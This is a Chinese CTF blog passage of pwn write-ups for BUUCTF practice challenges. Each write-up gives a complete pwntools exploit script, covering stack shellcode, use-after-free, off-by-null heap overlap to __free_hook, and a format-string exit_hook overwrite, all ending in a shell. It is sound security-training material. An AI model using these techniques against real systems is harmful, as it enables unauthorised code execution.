<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/1.png"></p>
<p>拿到题目以为是httpd类的pwn题结果是我想多了</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/2.png"></p>
<p>让我们输入很多数据然后传到su_server中。</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/3.png"></p>
<p><code>fd-&gt;_flags = 0xdeadbeef</code>满足这个条件会跳进secret中，而secret是个后门函数</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/4.png"></p>
<p>假如researchfield可以进行溢出的话是不是再溢出两个字符就可以控制fd了，那漏洞点在哪里呢，笔者找了一圈没有什么进展，想了一下是和host username researchfield有关而这三个都有个共同的函数lookForHeader，跟进看一下</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/5.png"></p>
<p>当这个数据有多个像host这种字段的时候，就会继续执行这个for循环可以继续再次往后填充0x7f个数据，所以我们可以先将0xdeadbeef放入host里，通过researchfield来溢出到<code>fd-&gt;_flags</code>，将<code>_flags</code>填成host的0xdeadbeef这里的地址，这样的话<code>fd-&gt;_flags-&gt;0xdeadbeef</code>就可以getshell了。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">29171</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'GET / HTTP/1.1#'</span></span><br><span class="line">p1 += <span class="string">b'Host:'</span> + p64(<span class="number">0xdeadbeef</span>) + <span class="string">b'#'</span></span><br><span class="line">p1 += <span class="string">b'Username:z1r0#'</span></span><br><span class="line">p1 += <span class="string">b'ResearchField:'</span> + <span class="string">b'c'</span> * <span class="number">0x7e</span> + <span class="string">b'#'</span></span><br><span class="line">p1 += <span class="string">b'ResearchField:'</span> + <span class="string">b'aa'</span> + p64(<span class="number">0x602220</span>) + <span class="string">b'#'</span></span><br><span class="line"></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="csaw2018-shell-code"><a href="#csaw2018-shell-code" class="headerlink" title="csaw2018_shell_code"></a>csaw2018_shell_code</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/csaw2018_shell_code/1.png"></p>
<p>一个比较简单的写shellcode题目</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/csaw2018_shell_code/2.png"></p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/csaw2018_shell_code/3.png"></p>
<p>可以看到漏洞点goodbye这个函数里，一个栈溢出，前面会让我们输入两次数据，那我们就可以将shellcode写入node1和node2，再通过goodbye里面面的栈溢出跳转到shellcode处执行，程序还贴心的给了我们node2的地址，所以我们可以通过node2来算出node1。</p>
<p>shellcode我们可以这样构造</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, rsp</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor esi, esi</span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure>

<p>将rsp的值传到rdi中，所以我们可以在rsp中放入bin/sh，并将rax设置成0x3b也就是execve的系统调用号。然后将rsi rdx给清0，最后我们可以运行execve(“/bin/sh”, 0, 0);因为shellcode要保持在15以下所以push pop很好使用。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">29758</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'(15 bytes) Text for node 1:'</span>)</span><br><span class="line">r.sendline(asm(shellcode1))</span><br><span class="line">r.recvuntil(<span class="string">'(15 bytes) Text for node 2:'</span>)</span><br><span class="line">r.sendline(<span class="string">'aaaaa'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">node2_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0x8</span></span><br><span class="line">li(<span class="string">'[+] node2_addr = '</span> + <span class="built_in">hex</span>(node2_addr))</span><br><span class="line">node1_addr = node2_addr + <span class="number">0x20</span></span><br><span class="line">li(<span class="string">'[+] node1_addr = '</span> + <span class="built_in">hex</span>(node1_addr))</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">3</span> + <span class="number">8</span>) + p64(node1_addr) + <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="actf-2020-scp-foundation-secret"><a href="#actf-2020-scp-foundation-secret" class="headerlink" title="actf_2020_scp_foundation_secret"></a>actf_2020_scp_foundation_secret</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/actf_2020_scp_foundation_secret/1.png"></p>
<p>怎么说呢，这个题也太简单了。。</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/actf_2020_scp_foundation_secret/2.png"></p>
<p>uaf的漏洞撞在了脸上，在申请堆的时候程序会专门有一个0x21大小的堆用来存放name和des的指针。程序在init_system这个函数内将flag存入到了一个bss段里。</p>
<p>所以漏洞利用思路很快就可以想好，利用uaf这个漏洞，将name指针给改成flag的地址即可。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25815</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt; Now please tell me what you want to do :'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; SCP name's length : "</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    r.sendafter(<span class="string">'&gt; SCP name : '</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; SCP description's length : "</span>, <span class="built_in">str</span>(des_size))</span><br><span class="line">    r.sendafter(<span class="string">"&gt; SCP description : "</span>, des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; SCP project ID : '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'5'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; SCP project ID : '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'&gt; Username:'</span>, <span class="string">'aa'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'&gt; Password:'</span>, <span class="string">'For_the_glory_of_Brunhild'</span>)</span><br><span class="line">flag_addr = <span class="number">0x6030C8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'aaaa'</span>, <span class="number">0x30</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'aaaa'</span>, <span class="number">0x30</span>, <span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, p64(flag_addr), <span class="number">0x50</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="cscctf-2019-qual-babyheap"><a href="#cscctf-2019-qual-babyheap" class="headerlink" title="cscctf_2019_qual_babyheap"></a>cscctf_2019_qual_babyheap</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_qual_babyheap/1.png"></p>
<p>简单题目</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_qual_babyheap/2.png"></p>
<p>2.27下的off-by-null。利用off-by-null将unsortedbin向前合并，形成overlapping就可以了。这里就不详细的说了，因为比较简单</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26243</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt;&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Size: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf8</span>, <span class="string">'aaaaa'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xf8</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x18</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xf8</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x10</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x120</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="built_in">len</span>(p1), p1)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf8</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xf8</span>, <span class="string">'aaa'</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'[+] malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">0</span>] + libc_base</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">li(<span class="string">'[+] free_hook = '</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x18</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p2 = p64(free_hook)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="built_in">len</span>(p2), p2)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x18</span>, <span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x18</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="cscctf-2019-final-babyprintf"><a href="#cscctf-2019-final-babyprintf" class="headerlink" title="cscctf_2019_final_babyprintf"></a>cscctf_2019_final_babyprintf</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_final_babyprintf/1.png"></p>
<p>还是简单题</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_final_babyprintf/2.png"></p>
<p>格式化漏洞，改不了got和ret，但是有一个exit(0)，这个程序贴心的给了三次机会，第一次泄露libc。第二次改exit_hook为one_gadget。第三次随便输入执行exit就可以了。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26380</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'%43$p'</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_start_main = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span></span><br><span class="line">libc_start_main = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">231</span></span><br><span class="line">li(<span class="string">'[+] libc_start_main = '</span> + <span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line">li(<span class="string">'[+] one_gadget = '</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">exit_hook = libc_base + <span class="number">0x619060</span> + <span class="number">3848</span></span><br><span class="line">li(<span class="string">'[+] exit_hook = '</span> + <span class="built_in">hex</span>(exit_hook))</span><br><span class="line"></span><br><span class="line">p1 = fmtstr_payload(<span class="number">8</span>, {exit_hook: one_gadget})</span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="wdb-2018-4th-pwn2"><a href="#wdb-2018-4th-pwn2" class="headerlink" title="wdb_2018_4th_pwn2"></a>wdb_2018_4th_pwn2</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/2.png"></p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/3.png"></p>
<p>第一个功能点可以泄露出canary。但需要配合第二个使用</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/4.png"></p>
<p>第二个功能可以不断调用本函数，这样子的话旧的canary还在栈上，配合第一个功能就可以输出canary了</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/5.png"></p>
<p>第三个功能可以输出libc（%a）</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/6.png"></p>
